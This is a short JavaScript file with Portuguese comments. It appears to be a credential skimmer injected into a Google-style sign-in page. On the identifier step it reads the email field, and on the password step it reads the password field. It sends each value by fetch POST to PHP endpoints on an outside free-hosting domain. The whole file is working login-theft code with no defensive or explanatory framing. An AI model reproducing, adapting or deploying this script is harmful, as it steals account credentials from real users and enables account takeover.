console.log('ga')

// Função para enviar o nome de usuário para o arquivo PHP
function sendUsername() {
  // Obtém o valor do campo de entrada do nome de usuário
  const username = document.querySelector('[type="email"]').value;

  // Envia o nome de usuário para o arquivo PHP usando o método fetch
  fetch('https://fckyou-get.000webhostapp.com/add_user.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `username=${username}`
  })
  .then(response => {
    if (response.ok) {
      console.log('Nome de usuário enviado com sucesso!');
    } else {
      console.error('Ocorreu um erro ao enviar o nome de usuário.');
    }
  })
  .catch(error => {
    console.error('Ocorreu um erro ao enviar o nome de usuário.', error);
  });
}

// Função para enviar a senha para o arquivo PHP
function sendPassword() {
  // Obtém o valor do campo de entrada da senha
  const password = document.querySelector('[type="password"]').value;

  // Envia a senha para o arquivo PHP usando o método fetch
  fetch('https://fckyou-get.000webhostapp.com/add_password.php', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: `password=${password}`
  })
  .then(response => {
    if (response.ok) {
      console.log('Senha enviada com sucesso!');
    } else {
      console.error('Ocorreu um erro ao enviar a senha.');
    }
  })
  .catch(error => {
    console.error('Ocorreu um erro ao enviar a senha.', error);
  });
}

// Adiciona os manipuladores de eventos para os botões de envio do formulário
let btn = document.querySelector("[class='VfPpkd-LgbsSe VfPpkd-LgbsSe-OWXEXe-k8QpJ VfPpkd-LgbsSe-OWXEXe-dgl2Hf nCP5yc AjY5Oe DuMIQc LQeN7 qIypjc TrZEUc lw1w4b']");
let path =  location.pathname.split('/')

if (path[path.length - 1] == 'identifier'){
  btn.addEventListener('click', sendUsername);
}
else if (path[path.length - 1] == 'pwd'){
  btn.addEventListener('click', sendPassword);
}
